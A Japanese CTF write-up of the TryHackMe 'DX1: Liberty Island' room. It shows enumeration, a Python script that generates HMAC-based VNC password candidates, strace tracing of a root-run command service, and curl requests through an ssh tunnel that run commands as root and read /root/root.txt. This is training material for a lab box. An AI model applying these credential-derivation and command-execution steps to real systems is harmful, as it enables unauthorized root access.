# DX1: Liberty Island CTF

https://tryhackme.com/room/dx1libertyislandplde

## Enumeration

```shell
TARGET=10.49.141.240
sudo bash -c "echo $TARGET   dx1 >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 64
80/tcp    open  http    syn-ack ttl 64
5901/tcp  open  vnc-1   syn-ack ttl 64
23023/tcp open  unknown syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,80,5901,23023 $TARGET

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
5901/tcp  open  vnc     VNC (protocol 3.8)
23023/tcp open  unknown
```

SSH, HTTP, VNC。23023 はHTTPで、下記表示。

```
UNATCO Liberty Island - Command/Control

RESTRICTED: ANGEL/OA

send a directive to process
```

80ポートのrobots.txt。alex という名前を発見。

```sh
$ cat ./robots.txt 
# Disallow: /datacubes # why just block this? no corp should crawl our stuff - alex
Disallow: *
```

## HTTP 80

`Site maintained by AJacobson//UNATCO.00013.76490`

### terrorism.html

- `Joseph Manderley`
- `Anna Navarre`

### threats.html

リンク切れのjsがある。

```html
<script src="injected.js"></script>
```

### badactors.html

悪意のあるユーザー名のリストが表示されている

```html
<div>
    <iframe src="badactors.txt"></iframe>
</div>
<footer>
    List is maintained by system admin, AJacobson//UNATCO.00013.76490
</footer>
<!-- if you can see this I might add you to the list. per United Nations directive #17, F12 is now a international cyber crime -->
```

### /datacubes

/datacubes/0000/ に転送されて下記表示。

```
Liberty Island Datapads Archive

All credentials within *should* be [redacted] - alert the administrators immediately if any are found that are 'clear text'

Access granted to personnel with clearance of Domination/5F or higher only.
```

0000以外を読めないかファジングしたら数件出てきた。

```sh
$ ffuf -u http://dx1/datacubes/FUZZ/ -w ./nums.txt -fs 90

0000                    [Status: 200, Size: 251, Words: 32, Lines: 3, Duration: 160ms]
0011                    [Status: 200, Size: 176, Words: 21, Lines: 5, Duration: 161ms]
0068                    [Status: 200, Size: 476, Words: 78, Lines: 12, Duration: 158ms]
0103                    [Status: 200, Size: 95, Words: 15, Lines: 2, Duration: 160ms]
0233                    [Status: 200, Size: 197, Words: 22, Lines: 6, Duration: 157ms]
0451                    [Status: 200, Size: 496, Words: 79, Lines: 10, Duration: 157ms]
```

`suckas` という名前。

```sh
$ curl http://dx1/datacubes/0011/
attention nightshift:<br/>
van camera system login (same as old login): [redacted]<br/>
new password: [redacted]<br/><br/>

PS) we *will* beat you at darts on saturday, suckas
```

`Johnathan`

```sh
$ curl http://dx1/datacubes/0068/
So many people use that ATM each day that it's busted 90% of the time.  But if
it's working, you might need some cash today for the pub crawl we've got
planned in the city.  Don't let the tourists get you down.  See you there
tonight, sweetie.<br/><br/>

Accnt#: [redacted]<br/>
PIN#: [redacted]<br/><br/>

Johnathan - your husband to be.<br/><br/>

PS) I was serious last night-I really want to get married in the Statue.  We
met there on duty and all our friends work there.
```

`ghermann`

```sh
$ curl http://dx1/datacubes/0103/
Change ghermann password to [redacted].  Next week I guess it'll be
[redacted].  Strange guy... 
```

```sh
$ curl http://dx1/datacubes/0233/
From: Data Administration<br/>
To: Maintenance<br/><br/>

Please change the entry codes on the east hatch to [redacted].<br/><br/>

NOTE: This datacube should be erased immediately upon completion.
```

VNC接続の認証情報について。`jacobson`

```sh
$ curl http://dx1/datacubes/0451/
Brother,<br/><br/>

I've set up <b>VNC</b> on this machine under jacobson's account. We don't know his loyalty, but should assume hostile.<br/>
Problem is he's good - no doubt he'll find it... a hasty defense, but
since we won't be here long, it should work.  <br/><br/>

The VNC login is the following message, 'smashthestate', hmac'ed with my username from the 'bad actors' list (lol). <br/>
Use md5 for the hmac hashing algo. The first 8 characters of the final hash is the VNC password.

- JL
```

badactors.txt から、イニシャル`JL`に該当する行だけ残してパスワードリストを生成。

```sh
import hmac
import hashlib

MESSAGE = b"smashthestate"
WORDLIST_FILE = "badactors.txt"

with open(WORDLIST_FILE, "r", encoding="utf-8", errors="ignore") as f:
    for line in f:
        word = line.strip()
        if not word:
            continue

        key = word.encode("utf-8")

        h = hmac.new(key, MESSAGE, hashlib.md5)
        digest = h.hexdigest()

        print(digest[:8])
```

```sh
$ python ./mk_passwd.py > vnc_passwds.txt
```

このうち1つのパスワードを使ってVNC接続成功。デスクトップが表示された。

```sh
$ vncviewer $TARGET:5901
Connected to RFB server, using protocol version 3.8
Performing standard VNC authentication
Password: 
Authentication successful
Desktop name "ip-10-49-141-240.ap-south-1.compute.internal:1 (ajacobson)"
VNC server default format:
  16 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 31 green 63 blue 31, shift red 11 green 5 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
```

見た目はWindowsだが、実体はLinux。  
デスクトップにELFファイルとフラグファイル。

```sh
C:\home\ajacobson\Desktop> ls -al
total 6792
drwxr-xr-x  2 ajacobson ajacobson    4096 Oct 22  2022 .
drwxr-xr-x 20 ajacobson ajacobson    4096 Dec 16 02:40 ..
-rwxr-xr-x  1 ajacobson ajacobson 6941856 Oct 22  2022 badactors-list
-rw-r--r--  1 ajacobson ajacobson     643 Oct 22  2022 user.txt
```

新しいパスワードと書かれているが、パスワードとしては使えなかった。

```sh
C:\home\ajacobson\Desktop> cat user.txt
From: JManderley//UNATCO.00013.76490
To: AJacobson//UNATCO.00013.76490
Subject: re: Security Breach

Thank you for keeping me informed of the recent hacker activity and your speedy
response to same.  I'm glad our security efforts were up to snuff.

(AJacobson//UNATCO.00013.76490) wrote:

>I managed to stop the guys (actually, it was some French chick
>the CIA's been watching, perhaps a Silhouette spy(?)) trying to
>break into the net, but I took the liberty of changing some
>passwords, just in case.  Here are the new ones:
>
> thm{[REDACTED]}
>
>You should probably delete this as soon as you're done reading, okay?
```

## 権限昇格

/opt の中は何かと思ったが、Linuxの見た目をWindows95風にするソフトだった。

```sh
C:\home> ls -al /opt
total 12
drwxr-xr-x  3 root root 4096 Oct 22  2022 .
drwxr-xr-x 19 root root 4096 Dec 16 02:40 ..
drwxr-xr-x 14 root root 4096 Oct 22  2022 Chicago95
```

ローカル 631 ポートで、CUPS 2.3.1 が稼働している。  
2.3.1 は、RCEが存在するような記事もあったが、具体的なエクスプロイトは発見できなかった。

```sh
C:\> ss -nltp
State  Recv-Q Send-Q Local Address:Port   Peer Address:Port Process                              

LISTEN 0      5          127.0.0.1:631         0.0.0.0:*
```

badactors-list は、go言語でビルドされたプログラムでリバースは困難。実行すると、/var/www/html/badactors.txt が更新された。

```sh
C:\var\www\html> cat badactors.txt 
test
```

このパーミッションで、なぜ badactors.txt を更新できたのかという疑問が生じる。

```sh
C:\var\www\html> ls -al badactors.txt
-rw-r--r-- 1 root root 5 Dec 16 05:09 badactors.txt

C:\var\www\html> ls -al /home/ajacobson/Desktop/
total 6792
drwxr-xr-x  2 ajacobson ajacobson    4096 Oct 22  2022 .
drwxr-xr-x 21 ajacobson ajacobson    4096 Dec 16 04:22 ..
-rwxr-xr-x  1 ajacobson ajacobson 6941856 Oct 22  2022 badactors-list
-rw-r--r--  1 ajacobson ajacobson     643 Oct 22  2022 user.txt
```

pspyで監視したところ、更新ボタンを押した瞬間に下記が出力された。

```sh
2025/12/16 05:29:43 CMD: UID=0     PID=3011   | /srv/unatco-cmd 
2025/12/16 05:29:43 CMD: UID=0     PID=3013   | bash -c echo dGVzdAphYWE= | base64 -d > /var/www/html/badactors.txt
```

`dGVzdAphYWE=` は、入力したテキストのBase64エンコード。何らかのプロセス間通信が行われている。unatco-cmd はrootにより実行されているため、ファイルを更新できている。

入力内容を操作することにより何かできるとは思えないので、プロセス間通信を理解する必要があると思われる。

/srv/unatco-cmd も、Go言語でビルドされたプログラム。

```sh
C:\home\ajacobson\Desktop> ls -al  /srv/unatco-cmd
-rwxr-xr-x 1 root root 6438779 Oct 22  2022 /srv/unatco-cmd

C:\home\ajacobson\Desktop> file  /srv/unatco-cmd
/srv/unatco-cmd: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=QN8mdFqa-D42IqNrlDx6/wxvSCIYuQeH0sgjQl0lf/9TTBVJFZLlOGfnzTuHOR/yFf-d2OO0iotVszdKXXw, not stripped
```

サービスとして実行されている。

```sh
/srv/unatco-cmdC:\home\ajacobson\Desktop> systemctl status unatco-cmd
● unatco-cmd.service - Start Unatco CMD
     Loaded: loaded (/etc/systemd/system/unatco-cmd.service; enabled; vendor preset: enabled)
     Active: active (running) since Tue 2025-12-16 02:40:23 UTC; 2h 59min ago
   Main PID: 745 (unatco-cmd)
      Tasks: 6 (limit: 2137)
     Memory: 6.1M
     CGroup: /system.slice/unatco-cmd.service
             └─745 /srv/unatco-cmd

Warning: some journal files were not opened due to insufficient permissions.
```

サービス定義

```sh
C:\home\ajacobson\Desktop> systemctl cat unatco-cmd
# /etc/systemd/system/unatco-cmd.service
[Unit]
Description=Start Unatco CMD

[Service]
User=root
Group=root
WorkingDirectory=/
ExecStart=/srv/unatco-cmd
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

straceで監視。23023ポートにHTTP接続していることを理解した。

```sh
C:\home\ajacobson\Desktop> strace -f -e connect -yy ./badactors-list

...
[pid  3849] connect(30<TCP:[118803]>, {sa_family=AF_INET, sin_port=htons(23023), sin_addr=inet_addr("127.0.0.1")}, 16) = -1 EINPROGRESS (Operation now in progress)
...
```

送受信データ全体が表示されるように strace を実行

```sh
strace -f -s 65536 -e trace=read,write,sendto,recvfrom ./badactors-list 2>./output.txt
```

23023 ポートに送信されているリクエストの形が判明した。

```sh
[pid  4741] read(30, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference' and `info' packages installed, try:\n# `info libc \"Name Service Switch\"' for information about this file.\n\npasswd:         files systemd\ngroup:          files systemd\nshadow:         files\ngshadow:        files\n\nhosts:          files mdns4_minimal [NOTFOUND=return] dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 1024) = 542
[pid  4741] read(30, "", 1024)          = 0
[pid  4741] read(30, "# This file is managed by man:systemd-resolved(8). Do not edit.\n#\n# This is a dynamic resolv.conf file for connecting local clients to the\n# internal DNS stub resolver of systemd-resolved. This file lists all\n# configured search domains.\n#\n# Run \"resolvectl status\" to see details about the uplink DNS servers\n# currently in use.\n#\n# Third party programs must not access this file directly, but only through the\n# symlink at /etc/resolv.conf. To manage man:resolv.conf(5) in a different way,\n# replace this symlink by a static file or a different symlink.\n#\n# See man:systemd-resolved.service(8) for details about the supported modes of\n# operation for /etc/resolv.conf.\n\nnameserver 127.0.0.53\noptions edns0 trust-ad\nsearch ap-south-1.compute.internal\n", 65536) = 752
[pid  4741] read(30, "", 64784)         = 0
[pid  4741] read(30, "", 65536)         = 0
[pid  4741] read(30, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference' and `info' packages installed, try:\n# `info libc \"Name Service Switch\"' for information about this file.\n\npasswd:         files systemd\ngroup:          files systemd\nshadow:         files\ngshadow:        files\n\nhosts:          files mdns4_minimal [NOTFOUND=return] dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 542
[pid  4741] read(30, "", 4096)          = 0
[pid  4741] read(30, "# The \"order\" line is only used by old versions of the C library.\norder hosts,bind\nmulti on\n", 4096) = 92
[pid  4741] read(30, "", 4096)          = 0
[pid  4741] read(30, "# This file is managed by man:systemd-resolved(8). Do not edit.\n#\n# This is a dynamic resolv.conf file for connecting local clients to the\n# internal DNS stub resolver of systemd-resolved. This file lists all\n# configured search domains.\n#\n# Run \"resolvectl status\" to see details about the uplink DNS servers\n# currently in use.\n#\n# Third party programs must not access this file directly, but only through the\n# symlink at /etc/resolv.conf. To manage man:resolv.conf(5) in a different way,\n# replace this symlink by a static file or a different symlink.\n#\n# See man:systemd-resolved.service(8) for details about the supported modes of\n# operation for /etc/resolv.conf.\n\nnameserver 127.0.0.53\noptions edns0 trust-ad\nsearch ap-south-1.compute.internal\n", 4096) = 752
[pid  4741] read(30, "", 4096)          = 0
[pid  4741] read(30, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\3005\0\0\0\0\0\0@\0\0\0\0\0\0\0\320\302\0\0\0\0\0\0\0\0\0\0@\08\0\v\0@\0\37\0\36\0\1\0\0\0\4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0h!\0\0\0\0\0\0h!\0\0\0\0\0\0\0\20\0\0\0\0\0\0\1\0\0\0\5\0\0\0\0000\0\0\0\0\0\0\0000\0\0\0\0\0\0\0000\0\0\0\0\0\0)j\0\0\0\0\0\0)j\0\0\0\0\0\0\0\20\0\0\0\0\0\0\1\0\0\0\4\0\0\0\0\240\0\0\0\0\0\0\0\240\0\0\0\0\0\0\0\240\0\0\0\0\0\0\\\35\0\0\0\0\0\0\\\35\0\0\0\0\0\0\0\20\0\0\0\0\0\0\1\0\0\0\6\0\0\0\240\275\0\0\0\0\0\0\240\315\0\0\0\0\0\0\240\315\0\0\0\0\0\0\330\3\0\0\0\0\0\0\230i\0\0\0\0\0\0\0\20\0\0\0\0\0\0\2\0\0\0\6\0\0\0\260\275\0\0\0\0\0\0\260\315\0\0\0\0\0\0\260\315\0\0\0\0\0\0\20\2\0\0\0\0\0\0\20\2\0\0\0\0\0\0\10\0\0\0\0\0\0\0\4\0\0\0\4\0\0\0\250\2\0\0\0\0\0\0\250\2\0\0\0\0\0\0\250\2\0\0\0\0\0\0 \0\0\0\0\0\0\0 \0\0\0\0\0\0\0\10\0\0\0\0\0\0\0\4\0\0\0\4\0\0\0\310\2\0\0\0\0\0\0\310\2\0\0\0\0\0\0\310\2\0\0\0\0\0\0D\0\0\0\0\0\0\0D\0\0\0\0\0\0\0\4\0\0\0\0\0\0\0S\345td\4\0\0\0\250\2\0\0\0\0\0\0\250\2\0\0\0\0\0\0\250\2\0\0\0\0\0\0 \0\0\0\0\0\0\0 \0\0\0\0\0\0\0\10\0\0\0\0\0\0\0P\345td\4\0\0\0 \242\0\0\0\0\0\0 \242\0\0\0\0\0\0 \242\0\0\0\0\0\0\254\2\0\0\0\0\0\0\254\2\0\0\0\0\0\0\4\0\0\0\0\0\0\0Q\345td\6\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0\0\0\0\0R\345td\4\0\0\0\240\275\0\0\0\0\0\0\240\315\0\0\0\0\0\0\240\315\0\0\0\0\0\0`\2\0\0\0\0\0\0`\2\0\0\0\0\0\0\1\0\0\0\0\0\0\0\4\0\0\0\20\0\0\0\5\0\0\0GNU\0\2\0\0\300\4\0\0\0\3\0\0\0\0\0\0\0\4\0\0\0\24\0\0\0\3\0\0\0GNU\0i\227\356i\317a\255\211C\301.n\334}#d\310\352n\245\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0k\0\0\0003\0\0\0\10\0\0\0\t\0\0\0\22F\344\25\240\245\201\0\t\10\28\223\6\310\0\0\0z\0]\201\240Jx\2108*\220\200\0$", 832) = 832
[pid  4741] read(30, "127.0.0.1 localhost\n127.0.1.1 ubuntu-server-2004-fresh\n\n# The following lines are desirable for IPv6 capable hosts\n::1     ip6-localhost ip6-loopback\nfe00::0 ip6-localnet\nff00::0 ip6-mcastprefix\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n127.0.0.1 UNATCO\n", 4096) = 256
[pid  4741] read(30, "", 4096)          = 0
[pid  4741] read(30, 0xc000153000, 4096) = -1 EAGAIN (Resource temporarily unavailable)
[pid  4742] write(30, "POST / HTTP/1.1\r\nHost: UNATCO:23023\r\nUser-Agent: Go-http-client/1.1\r\nContent-Length: 49\r\nClearance-Code: 7gFfT7[REDACTED]\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Encoding: gzip\r\n\r\ndirective=cat+%2Fvar%2Fwww%2Fhtml%2Fbadactors.txt", 250) = 250
[pid  4740] read(30, "HTTP/1.1 202 Accepted\r\nAccess-Control-Allow-Origin: *\r\nContent-Type: text/plain\r\nDate: Tue, 16 Dec 2025 06:30:20 GMT\r\nContent-Length: 12\r\n\r\ntest\naaa\naaa", 4096) = 152
[pid  4741] read(30, 0xc000153000, 4096) = -1 EAGAIN (Resource temporarily unavailable)
[pid  4740] write(30, "POST / HTTP/1.1\r\nHost: UNATCO:23023\r\nUser-Agent: Go-http-client/1.1\r\nContent-Length: 89\r\nClearance-Code: 7gFfT7[REDACTED]\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Encoding: gzip\r\n\r\ndirective=echo+dGVzdAphYWEKYWFhYWFh+%7C+base64+-d+%3E+%2Fvar%2Fwww%2Fhtml%2Fbadactors.txt", 290) = 290
[pid  4742] read(30, "HTTP/1.1 202 Accepted\r\nAccess-Control-Allow-Origin: *\r\nContent-Type: text/plain\r\nDate: Tue, 16 Dec 2025 06:30:24 GMT\r\nContent-Length: 0\r\n\r\n", 4096) = 139
[pid  4742] read(30,  <unfinished ...>
```

23023 ポートをトンネリング

```sh
$ ssh -L 23023:localhost:23023 ajacobson@10.49.185.52 -i ./id_rsa
```

コマンド実行成功。

```sh
$ curl -v http://localhost:23023/ -X POST -H 'Host: UNATCO:23023' -H 'User-Agent: Go-http-client/1.1' -H 'Clearance-Code: 7gFfT7[REDACTED]' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept-Encoding: gzip' -d 'directive=id'
Note: Unnecessary use of -X or --request, POST is already inferred.
* Host localhost:23023 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:23023...
* Connected to localhost (::1) port 23023
* using HTTP/1.x
> POST / HTTP/1.1
> Host: UNATCO:23023
> Accept: */*
> User-Agent: Go-http-client/1.1
> Clearance-Code: 7gFfT7[REDACTED]
> Content-Type: application/x-www-form-urlencoded
> Accept-Encoding: gzip
> Content-Length: 12
> 
* upload completely sent off: 12 bytes
< HTTP/1.1 202 Accepted
< Access-Control-Allow-Origin: *
< Content-Type: text/plain
< Date: Tue, 16 Dec 2025 06:40:05 GMT
< Content-Length: 39
< 
uid=0(root) gid=0(root) groups=0(root)
* Connection #0 to host localhost left intact
```

フラグ出力

```sh
$ curl -v http://localhost:23023/ -X POST -H 'Host: UNATCO:23023' -H 'User-Agent: Go-http-client/1.1' -H 'Clearance-Code: 7gFfT7[REDACTED]' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Accept-Encoding: gzip' -d 'directive=cat%20/root/root.txt'
Note: Unnecessary use of -X or --request, POST is already inferred.
* Host localhost:23023 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:23023...
* Connected to localhost (::1) port 23023
* using HTTP/1.x
> POST / HTTP/1.1
> Host: UNATCO:23023
> Accept: */*
> User-Agent: Go-http-client/1.1
> Clearance-Code: 7gFfT7[REDACTED]
> Content-Type: application/x-www-form-urlencoded
> Accept-Encoding: gzip
> Content-Length: 30
> 
* upload completely sent off: 30 bytes
< HTTP/1.1 202 Accepted
< Access-Control-Allow-Origin: *
< Content-Type: text/plain
< Date: Tue, 16 Dec 2025 06:41:10 GMT
< Content-Length: 276
< 

From: AJacobson//UNATCO.00013.76490
To: JCDenton//UNATCO.82098.9868
Subject: Come by my office

We need to talk about that last mission.  In person, not infolink.  Come by my
office after you've been debriefed by Manderley.

    thm{[REDACTED]}

-alex-
* Connection #0 to host localhost left intact
```

## 振り返り

- VNCを使うBOXは、数日前に続き2回目のため慣れた。
- badactors.txt 更新に関するパーミッションの不可解さから、プロセス間通信に気付いて調査に取り掛かれた点はファインプレーだった。
- 送受信データを見る必要から、strace の使い方を学べて良い勉強になった。

## Tags

#tags:VNC #tags:strace
